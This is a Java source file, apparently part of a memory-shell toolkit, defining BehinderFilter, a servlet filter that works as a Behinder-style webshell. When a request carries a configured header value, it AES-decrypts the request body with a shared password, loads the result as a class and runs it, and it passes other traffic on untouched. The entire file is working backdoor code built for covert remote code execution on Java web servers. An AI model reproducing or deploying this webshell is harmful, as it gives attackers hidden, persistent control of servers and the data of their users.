package com.reajason.javaweb.memshell.shelltool.behinder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderFilter extends ClassLoader implements Filter {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    public BehinderFilter() {
    }

    public BehinderFilter(ClassLoader c) {
        super(c);
    }

    @Override
    @SuppressWarnings("all")
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;

        try {
            if (request.getHeader(this.headerName) != null
                    && request.getHeader(this.headerName).contains(this.headerValue)) {
                HttpSession session = ((HttpServletRequest) servletRequest).getSession();
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", servletRequest);
                obj.put("response", unwrap(response));
                obj.put("session", session);
                session.setAttribute("u", this.pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                byte[] bytes = c.doFinal(base64Decode(servletRequest.getReader().readLine()));
                Object instance = new BehinderFilter(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length).newInstance();
                instance.equals(obj);
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj) {
        try {
            return getFieldValue(obj, "response");
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException();
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }
}
